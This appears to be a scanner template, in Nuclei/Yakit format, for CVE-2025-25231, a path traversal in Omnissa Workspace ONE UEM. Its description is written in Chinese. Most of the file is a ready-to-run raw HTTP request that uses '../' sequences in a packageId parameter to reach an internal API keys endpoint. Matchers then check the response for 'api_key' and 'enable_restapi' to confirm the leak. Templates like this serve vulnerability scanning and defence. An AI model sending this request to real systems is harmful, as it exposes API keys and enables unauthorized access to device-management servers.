script_name: Omnissa Workspace ONE UEM路径遍历漏洞
content:
id: CVE-2025-25231

info:
  name: Omnissa Workspace ONE UEM路径遍历漏洞
  author: Dean
  severity: high
  description: Omnissa Workspace ONE UEM 包含由对受限 API 端点的 GET 请求引起的路径遍历，允许恶意行为者访问敏感信息，利用该漏洞需要发送精心设计的请求。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 6953a065bd5646f558c67c47fa88d34e

http:
- raw:
  - |+
    @timeout: 30s
    GET /DevicesGateway/apps/system-app-metadata/1?packageId=../../../../API/system/groups/apikeys%3fogname=Global HTTP/1.1
    Host: {{Hostname}}


  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    words:
    - enable_restapi
    - api_key
    condition: and
